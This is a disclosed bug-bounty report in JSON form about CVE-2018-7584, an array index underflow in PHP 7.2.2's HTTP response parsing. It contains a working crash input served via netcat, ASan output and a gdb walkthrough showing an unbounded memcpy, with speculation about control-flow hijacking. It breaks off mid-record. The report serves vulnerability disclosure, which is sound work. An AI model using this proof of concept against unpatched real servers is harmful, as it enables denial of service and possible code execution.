{"id":320222,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjAyMjI=","url":"https://hackerone.com/reports/320222","title":"memory corruption while parsing HTTP response","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-02-27T09:14:23.915Z","submitted_at":"2018-02-27T09:14:23.915Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"xixabangm4","url":"/xixabangm4","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-7584"],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-14T04:37:33.702Z","bug_reporter_agreed_on_going_public_at":"2019-10-14T04:37:33.650Z","team_member_agreed_on_going_public_at":"2019-10-13T09:18:25.984Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"In the network interfacing PHP API file_get_contents(), a mechanism is implemented to parse the HTTP/S response from the remote host. A vulnerability is found when the vulnerable PHP build processes certain malformed HTTP/S response packets, resulting an array negative indexing. \n\nVulnerable code at:\n```\nphp_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723\n\n\t\t\tif (tmp_line[tmp_line_len - 1] == '\\n') {\n\t\t\t\t--tmp_line_len;\n\t\t\t\tif (tmp_line[tmp_line_len - 1] == '\\r') {\n\t\t\t\t\t--tmp_line_len;\n\t\t\t\t}\n```\n\nIf the proceeding buffer contains '\\r' as either controlled content or junk on stack, under a realistic setting (non-ASAN), tmp_line_len could go to -1, resulting in an extra large string being copied subsequently. Under ASAN a segfault can be observed.\n```\n$ bin/php --version\nPHP 7.2.2 (cli) (built: Feb 20 2018 08:51:24) ( NTS )\nCopyright (c) 1997-2018 The PHP Group\nZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies\n```\n\nTest script:\n```\n---------------\n$ xxd -g 1 poc\n0000000: 30 30 30 30 30 30 30 30 30 31 30 30 0a 0a        000000000100..\n```\n```\n$ nc -vvlp 8080 \u003c poc\nListening on [0.0.0.0] (family 0, port 8080)\nConnection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 53083)\nGET / HTTP/1.0\nHost: localhost:8080\nConnection: close\n\n$ bin/php -r 'file_get_contents(\"http://localhost:8080\");'\n```\nExpected result:\n----------------\nNO CRASH\n\nActual result:\n```\n--------------\n$ bin/php -r 'file_get_contents(\"http://localhost:8080\");'\n=================================================================\n==26249== ERROR: AddressSanitizer: stack-buffer-overflow on address 0xbfc038ef at pc 0x8aa393b bp 0xbfc02eb8 sp 0xbfc02eac\nREAD of size 1 at 0xbfc038ef thread T0\n    #0 0x8aa393a in php_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723\n    #1 0x8aa61fb in php_stream_url_wrap_http /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:979\n    #2 0x8b8b115 in _php_stream_open_wrapper_ex /home/weilei/php-7.2.2/main/streams/streams.c:2027\n    #3 0x8918dc0 in zif_file_get_contents /home/weilei/php-7.2.2/ext/standard/file.c:550\n    #4 0x867993a in phar_file_get_contents /home/weilei/php-7.2.2/ext/phar/func_interceptors.c:224\n    #5 0x91ee267 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:573\n    #6 0x91ee267 in execute_ex /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:59731\n    #7 0x923c13c in zend_execute /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:63760\n    #8 0x8cba975 in zend_eval_stringl /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1082\n    #9 0x8cbaf66 in zend_eval_stringl_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1123\n    #10 0x8cbb06b in zend_eval_string_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1134\n    #11 0x9244455 in do_cli /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1042\n    #12 0x9246b37 in main /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1404\n    #13 0xb5e8ca82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)\n    #14 0x80656d0 in _start (/home/weilei/php7_asan/bin/php+0x80656d0)\nAddress 0xbfc038ef is located at offset 607 in frame \u003cphp_stream_url_wrap_http_ex\u003e of T0's stack:\n  This frame has 13 object(s):\n    [32, 36) 'transport_string'\n    [96, 100) 'errstr'\n    [160, 164) 'http_header_line_length'\n    [224, 232) 'timeout'\n    [288, 296) 'req_buf'\n    [352, 360) 'tmpstr'\n    [416, 432) 'ssl_proxy_peer_name'\n    [480, 496) 'http_header'\n    [544, 576) 'buf'\n    [608, 736) 'tmp_line'\n    [768, 1792) 'location'\n    [1824, 2848) 'new_path'\n    [2880, 3904) 'loc_path'\nHINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext\n      (longjmp and C++ exceptions *are* supported)\nSUMMARY: AddressSanitizer: stack-buffer-overflow /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723 php_stream_url_wrap_http_ex\nShadow bytes around the buggy address:\n  0x37f806c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x37f806d0: 00 00 f1 f1 f1 f1 04 f4 f4 f4 f2 f2 f2 f2 04 f4\n  0x37f806e0: f4 f4 f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 f4\n  0x37f806f0: f4 f4 f2 f2 f2 f2 00 f4 f4 f4 f2 f2 f2 f2 00 f4\n  0x37f80700: f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00\n=\u003e0x37f80710: f4 f4 f2 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00\n  0x37f80720: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2\n  0x37f80730: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x37f80740: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x37f80750: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x37f80760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:     fa\n  Heap righ redzone:     fb\n  Freed Heap region:     fd\n  Stack left redzone:    f1\n  Stack mid redzone:     f2\n  Stack right redzone:   f3\n  Stack partial redzone: f4\n  Stack after return:    f5\n  Stack use after scope: f8\n  Global redzone:        f9\n  Global init order:     f6\n  Poisoned by user:      f7\n  ASan internal:         fe\n==26249== ABORTING\nAborted\n```\n\nDetails can be found at https://bugs.php.net/bug.php?id=75981\nThe bug is fixed in the security repo and is pending CVE assignment.\n\n## Impact\n\nA DoS can be triggered when certain conditions are met, or other implications from the subsequent string operations. The affected mechanism is popular as file_get_contents() is a very popular API among PHP based web applications.","vulnerability_information_html":"\u003cp\u003eIn the network interfacing PHP API file_get_contents(), a mechanism is implemented to parse the HTTP/S response from the remote host. A vulnerability is found when the vulnerable PHP build processes certain malformed HTTP/S response packets, resulting an array negative indexing. \u003c/p\u003e\n\n\u003cp\u003eVulnerable code at:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ephp_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723\n\n            if (tmp_line[tmp_line_len - 1] == \u0026#39;\\n\u0026#39;) {\n                --tmp_line_len;\n                if (tmp_line[tmp_line_len - 1] == \u0026#39;\\r\u0026#39;) {\n                    --tmp_line_len;\n                }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf the proceeding buffer contains \u0026#39;\\r\u0026#39; as either controlled content or junk on stack, under a realistic setting (non-ASAN), tmp_line_len could go to -1, resulting in an extra large string being copied subsequently. Under ASAN a segfault can be observed.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ bin/php --version\nPHP 7.2.2 (cli) (built: Feb 20 2018 08:51:24) ( NTS )\nCopyright (c) 1997-2018 The PHP Group\nZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTest script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e---------------\n$ xxd -g 1 poc\n0000000: 30 30 30 30 30 30 30 30 30 31 30 30 0a 0a        000000000100..\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ nc -vvlp 8080 \u0026lt; poc\nListening on [0.0.0.0] (family 0, port 8080)\nConnection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 53083)\nGET / HTTP/1.0\nHost: localhost:8080\nConnection: close\n\n$ bin/php -r \u0026#39;file_get_contents(\u0026quot;http://localhost:8080\u0026quot;);\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"expected-result\"\u003eExpected result:\u003c/h2\u003e\n\n\u003cp\u003eNO CRASH\u003c/p\u003e\n\n\u003cp\u003eActual result:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e--------------\n$ bin/php -r \u0026#39;file_get_contents(\u0026quot;http://localhost:8080\u0026quot;);\u0026#39;\n=================================================================\n==26249== ERROR: AddressSanitizer: stack-buffer-overflow on address 0xbfc038ef at pc 0x8aa393b bp 0xbfc02eb8 sp 0xbfc02eac\nREAD of size 1 at 0xbfc038ef thread T0\n    #0 0x8aa393a in php_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723\n    #1 0x8aa61fb in php_stream_url_wrap_http /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:979\n    #2 0x8b8b115 in _php_stream_open_wrapper_ex /home/weilei/php-7.2.2/main/streams/streams.c:2027\n    #3 0x8918dc0 in zif_file_get_contents /home/weilei/php-7.2.2/ext/standard/file.c:550\n    #4 0x867993a in phar_file_get_contents /home/weilei/php-7.2.2/ext/phar/func_interceptors.c:224\n    #5 0x91ee267 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:573\n    #6 0x91ee267 in execute_ex /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:59731\n    #7 0x923c13c in zend_execute /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:63760\n    #8 0x8cba975 in zend_eval_stringl /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1082\n    #9 0x8cbaf66 in zend_eval_stringl_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1123\n    #10 0x8cbb06b in zend_eval_string_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1134\n    #11 0x9244455 in do_cli /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1042\n    #12 0x9246b37 in main /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1404\n    #13 0xb5e8ca82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)\n    #14 0x80656d0 in _start (/home/weilei/php7_asan/bin/php+0x80656d0)\nAddress 0xbfc038ef is located at offset 607 in frame \u0026lt;php_stream_url_wrap_http_ex\u0026gt; of T0\u0026#39;s stack:\n  This frame has 13 object(s):\n    [32, 36) \u0026#39;transport_string\u0026#39;\n    [96, 100) \u0026#39;errstr\u0026#39;\n    [160, 164) \u0026#39;http_header_line_length\u0026#39;\n    [224, 232) \u0026#39;timeout\u0026#39;\n    [288, 296) \u0026#39;req_buf\u0026#39;\n    [352, 360) \u0026#39;tmpstr\u0026#39;\n    [416, 432) \u0026#39;ssl_proxy_peer_name\u0026#39;\n    [480, 496) \u0026#39;http_header\u0026#39;\n    [544, 576) \u0026#39;buf\u0026#39;\n    [608, 736) \u0026#39;tmp_line\u0026#39;\n    [768, 1792) \u0026#39;location\u0026#39;\n    [1824, 2848) \u0026#39;new_path\u0026#39;\n    [2880, 3904) \u0026#39;loc_path\u0026#39;\nHINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext\n      (longjmp and C++ exceptions *are* supported)\nSUMMARY: AddressSanitizer: stack-buffer-overflow /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723 php_stream_url_wrap_http_ex\nShadow bytes around the buggy address:\n  0x37f806c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x37f806d0: 00 00 f1 f1 f1 f1 04 f4 f4 f4 f2 f2 f2 f2 04 f4\n  0x37f806e0: f4 f4 f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 f4\n  0x37f806f0: f4 f4 f2 f2 f2 f2 00 f4 f4 f4 f2 f2 f2 f2 00 f4\n  0x37f80700: f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00\n=\u0026gt;0x37f80710: f4 f4 f2 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00\n  0x37f80720: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2\n  0x37f80730: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x37f80740: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x37f80750: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x37f80760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:     fa\n  Heap righ redzone:     fb\n  Freed Heap region:     fd\n  Stack left redzone:    f1\n  Stack mid redzone:     f2\n  Stack right redzone:   f3\n  Stack partial redzone: f4\n  Stack after return:    f5\n  Stack use after scope: f8\n  Global redzone:        f9\n  Global init order:     f6\n  Poisoned by user:      f7\n  ASan internal:         fe\n==26249== ABORTING\nAborted\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDetails can be found at \u003ca title=\"https://bugs.php.net/bug.php?id=75981\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D75981\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=75981\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThe bug is fixed in the security repo and is pending CVE assignment.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eA DoS can be triggered when certain conditions are met, or other implications from the subsequent string operations. The affected mechanism is popular as file_get_contents() is a very popular API among PHP based web applications.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":12,"name":"Array Index Underflow"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:18:26.051Z","allow_singular_disclosure_after":-35669764.46243613,"singular_disclosure_allowed":true,"vote_count":1,"voters":["smodnix"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2438175,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Reproducible: Yes. Please follow the above posted PHP bug report.\nImpact: discussed above.\nIn Scope: remote interface, should be considered of higher impact. ","markdown_message":"\u003cp\u003eReproducible: Yes. Please follow the above posted PHP bug report.\u003cbr\u003e\nImpact: discussed above.\u003cbr\u003e\nIn Scope: remote interface, should be considered of higher impact. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-27T09:16:49.250Z","updated_at":"2018-02-27T09:16:49.250Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2451745,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This issue is assigned CVE-2018-7584.\nhttp://php.net/ChangeLog-7.php","markdown_message":"\u003cp\u003eThis issue is assigned CVE-2018-7584.\u003cbr\u003e\n\u003ca title=\"http://php.net/ChangeLog-7.php\" href=\"/redirect?url=http%3A%2F%2Fphp.net%2FChangeLog-7.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://php.net/ChangeLog-7.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-03T01:48:31.109Z","updated_at":"2018-03-03T01:48:31.109Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2462428,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\nThe bug can be manipulated to achieve an unbounded memcpy from the stack to a small heap buffer. On Linux, this would result in a DoS when the src of memcpy reaches stack top; on Windows, control flow hijacking may be possible if a SIGSEGV handler can be overwritten before the memcpy crashes once reaching stack or heap boundary.\n\n```\n$ nc -vvlp 8888 \u003c poc\n\n$ gdb --args bin/php -r 'file_get_contents(\"http://localhost:8888\");' \n\n(gdb) b main\nBreakpoint 1 at 0x865ef67: file /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c, line 1216.\n\n(gdb) r\nStarting program: /home/weilei/php7_gdb/bin/php -r file_get_contents\\(\\\"http://localhost:8888\\\"\\)\\;\n\nBreakpoint 1, main (argc=3, argv=0xbfffe9c4) at /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c:1216\n1216            int exit_status = SUCCESS;\n\n(gdb) b http_fopen_wrapper.c:721\nBreakpoint 2 at 0x8424276: file /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c, line 721.\n\n(gdb) c\nContinuing.\n\nBreakpoint 2, php_stream_url_wrap_http_ex (wrapper=0x8d5c0ac \u003cphp_stream_http_wrapper\u003e, path=0x8e7cb20 \"http://localhost:8888\", mode=0x8c4a516 \"rb\", options=0, opened_path=0x0, context=0x8e74970, \n    redirect_max=20, flags=1, response_header=0xbfffb9b0) at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:721\n721                             if (tmp_line[tmp_line_len - 1] == '\\n') {\n\n(gdb) x/10wx tmp_line\n0xbfffaccc:     0x3030000a      0x30303030      0x30303130      0x0000000a\n0xbfffacdc:     0x00000000      0x00000000      0x00000000      0x00000000\n0xbfffacec:     0x00000000      0x00000000\n\n// *** Pre-condition of the large copy: tmp_line[-1] == 0x0d\n// With the zend allocator, it is relatively easier to control the value of tmp_line[-1] to be '\\r':\n\n722                                     --tmp_line_len;\n(gdb) p tmp_line_len\n$2 = 1\n\n(gdb) n\n723                                     if (tmp_line[tmp_line_len - 1] == '\\r') {\n\n(gdb) p tmp_line_len\n$3 = 0\n\n// If customised heap allocator is configured for the PHP build, more investigation is needed.\n// On both Linux and Windows, the default configuration is the Zend allocator. For now:\n\n(gdb) set *((char*)tmp_line - 1) = '\\r'\n\n(gdb) x/10bx tmp_line\n0xbfffaccc:     0x0a    0x00    0x30    0x30    0x30    0x30    0x30    0x30\n0xbfffacd4:     0x30    0x31\n\n(gdb) x/10bx tmp_line - 8\n0xbfffacc4:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x0d\n0xbfffaccc:     0x0a    0x00\n\n(gdb) n\n724                                             --tmp_line_len;\n(gdb) n\n727                             ZVAL_STRINGL(\u0026http_response, tmp_line, tmp_line_len);\n\n(gdb) p/x tmp_line_len \n$5 = 0xffffffff\n\n// http_response is a new zval structure declared on the stack, step into line 727\n// a zend_string will be allocated, due to addition of a header and subsequent calls\n// to _ZSTR_STRUCT_SIZE(len) and ZEND_MM_ALIGNED_SIZE(), the allocation size wraps to\n// 16 bytes on the heap.\n\n(gdb) s\nzend_string_init (persistent=0, len=4294967295, str=0xbfffaccc \"\\n\") at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:727\n727                             ZVAL_STRINGL(\u0026http_response, tmp_line, tmp_line_len);\n\n(gdb) s\nzend_string_alloc (persistent=0, len=4294967295) at /home/weilei/php-7.2.2-release/Zend/zend_string.h:134\n134             zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);\n\n(gdb) p len\n$9 = 4294967295\n\n(gdb) s\n_emalloc (size=16) at /home/weilei/php-7.2.2-release/Zend/zend_alloc.c:2425\n2425            if (UNEXPECTED(AG(mm_heap)-\u003euse_custom_heap)) {\n(gdb) s\n2429                            return AG(mm_heap)-\u003ecustom_heap.std._malloc(size);\n(gdb) p size\n$10 = 16\n(gdb) finish\nRun till exit from #0  _emalloc (size=16) at /home/weilei/php-7.2.2-release/Zend/zend_alloc.c:2429\n0x08424336 in zend_string_alloc (persistent=0, len=4294967295) at /home/weilei/php-7.2.2-release/Zend/zend_string.h:134\n134             zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);\nValue returned is $11 = (void *) 0x8e7cf80\n\n// after a few source line stepping:\n\n(gdb) n\n172             memcpy(ZSTR_VAL(ret), str, len);\n\n(gdb) p len\n$17 = 4294967295\n\n(gdb) p/x *ret\n$18 = {gc = {refcount = 0x1, u = {v = {type = 0x6, flags = 0x0, gc_info = 0x0}, type_info = 0x6}}, h = 0x0, len = 0xffffffff, val = {0x18}}\n\n(gdb) x/s str\n0xbfffaccc:     \"\\n\"\n\n(gdb) s\n__memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:111\n111     ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S: No such file or directory.\n(gdb) bt\n#0  __memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:111\n#1  0x084243bf in zend_string_init (persistent=0, len=4294967295, str=0xbfffaccc \"\\n\") at /home/weilei/php-7.2.2-release/Zend/zend_string.h:172\n#2  php_stream_url_wrap_http_ex (wrapper=0x8d5c0ac \u003cphp_stream_http_wrapper\u003e, path=0x8e7cb20 \"http://localhost:8888\", mode=0x8c4a516 \"rb\", options=0, opened_path=0x0, context=0x8e74970, redirect_max=20, \n    flags=1, response_header=0xbfffb9b0) at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:727\n#3  0x08425594 in php_stream_url_wrap_http (wrapper=0x8d5c0ac \u003cphp_stream_http_wrapper\u003e, path=0x8e7cb20 \"http://localhost:8888\", mode=0x8c4a516 \"rb\", options=0, opened_path=0x0, context=0x8e74970)\n    at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:979\n#4  0x0847b77f in _php_stream_open_wrapper_ex (path=0x8e7cb20 \"http://localhost:8888\", mode=0x8c4a516 \"rb\", options=8, opened_path=0x0, context=0x8e74970)\n    at /home/weilei/php-7.2.2-release/main/streams/streams.c:2027\n#5  0x08388a60 in zif_file_get_contents (execute_data=0xb79ed068, return_value=0xbfffd300) at /home/weilei/php-7.2.2-release/ext/standard/file.c:550\n#6  0x082a42d0 in phar_file_get_contents (execute_data=0xb79ed068, return_value=0xbfffd300) at /home/weilei/php-7.2.2-release/ext/phar/func_interceptors.c:224\n#7  0x08647e4a in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER () at /home/weilei/php-7.2.2-release/Zend/zend_vm_execute.h:573\n#8  execute_ex (ex=0xb79ed028) at /home/weilei/php-7.2.2-release/Zend/zend_vm_execute.h:59731\n#9  0x0865b6a9 in zend_execute (op_array=0x8e7cb40, return_value=0xbfffd474) at /home/weilei/php-7.2.2-release/Zend/zend_vm_execute.h:63760\n#10 0x084da344 in zend_eval_stringl (str=0x8d859a0 \"file_get_contents(\\\"http://localhost:8888\\\");\", str_len=43, retval_ptr=0x0, string_name=0x8cdc728 \"Command line code\")\n    at /home/weilei/php-7.2.2-release/Zend/zend_execute_API.c:1082\n#11 0x084da53e in zend_eval_stringl_ex (str=0x8d859a0 \"file_get_contents(\\\"http://localhost:8888\\\");\", str_len=43, retval_ptr=0x0, string_name=0x8cdc728 \"Command line code\", handle_exceptions=1)\n    at /home/weilei/php-7.2.2-release/Zend/zend_execute_API.c:1123\n#12 0x084da5a6 in zend_eval_string_ex (str=0x8d859a0 \"file_get_contents(\\\"http://localhost:8888\\\");\", retval_ptr=0x0, string_name=0x8cdc728 \"Command line code\", handle_exceptions=1)\n    at /home/weilei/php-7.2.2-release/Zend/zend_execute_API.c:1134\n#13 0x0865e5e0 in do_cli (argc=3, argv=0x8d85950) at /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c:1042\n#14 0x0865f53c in main (argc=3, argv=0x8d85950) at /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c:1404\n\n(gdb) x/8wx $esp\n0xbfffa4cc:     0x084243bf      0x08e7cf90      0xbfffaccc      0xffffffff\n0xbfffa4dc:     0xbfffa59c      0x00000000      0xbfffac9c      0x08e74970\n\n// would result in memcpy(0x08e7cf90, 0xbfffaccc, 0xffffffff);\n\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:1284\n1284    in ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S\n\n(gdb) info reg\neax            0xbfffffec       -1073741844\necx            0xffffac5f       -21409\nedx            0x8e822b0        149430960\nebx            0xb7e02000       -1210048512\nesp            0xbfffa4c8       0xbfffa4c8\nebp            0xbfffb968       0xbfffb968\nesi            0xb79ed028       -1214328792\nedi            0x8e7cc20        149408800\neip            0xb7d8c497       0xb7d8c497 \u003c__memcpy_ssse3_rep+3431\u003e\neflags         0x10286  [ PF SF IF RF ]\ncs             0x73     115\nss             0x7b     123\nds             0x7b     123\nes             0x7b     123\nfs             0x0      0\ngs             0x33     51\n(gdb) x/10i $eip\n=\u003e 0xb7d8c497 \u003c__memcpy_ssse3_rep+3431\u003e:        movdqu 0x10(%eax),%xmm1\n   0xb7d8c49c \u003c__memcpy_ssse3_rep+3436\u003e:        movdqu 0x20(%eax),%xmm2\n   0xb7d8c4a1 \u003c__memcpy_ssse3_rep+3441\u003e:        movdqu 0x30(%eax),%xmm3\n   0xb7d8c4a6 \u003c__memcpy_ssse3_rep+3446\u003e:        movdqu 0x40(%eax),%xmm4\n   0xb7d8c4ab \u003c__memcpy_ssse3_rep+3451\u003e:        movdqu 0x50(%eax),%xmm5\n   0xb7d8c4b0 \u003c__memcpy_ssse3_rep+3456\u003e:        movdqu 0x60(%eax),%xmm6\n   0xb7d8c4b5 \u003c__memcpy_ssse3_rep+3461\u003e:        movdqu 0x70(%eax),%xmm7\n   0xb7d8c4ba \u003c__memcpy_ssse3_rep+3466\u003e:        lea    0x80(%eax),%eax\n   0xb7d8c4c0 \u003c__memcpy_ssse3_rep+3472\u003e:        lfence \n   0xb7d8c4c3 \u003c__memcpy_ssse3_rep+3475\u003e:        sub    $0x80,%ecx\n\n```\n","markdown_message":"\u003cp\u003eThe bug can be manipulated to achieve an unbounded memcpy from the stack to a small heap buffer. On Linux, this would result in a DoS when the src of memcpy reaches stack top; on Windows, control flow hijacking may be possible if a SIGSEGV handler can be overwritten before the memcpy crashes once reaching stack or heap boundary.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ nc -vvlp 8888 \u0026lt; poc\n\n$ gdb --args bin/php -r \u0026#39;file_get_contents(\u0026quot;http://localhost:8888\u0026quot;);\u0026#39; \n\n(gdb) b main\nBreakpoint 1 at 0x865ef67: file /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c, line 1216.\n\n(gdb) r\nStarting program: /home/weilei/php7_gdb/bin/php -r 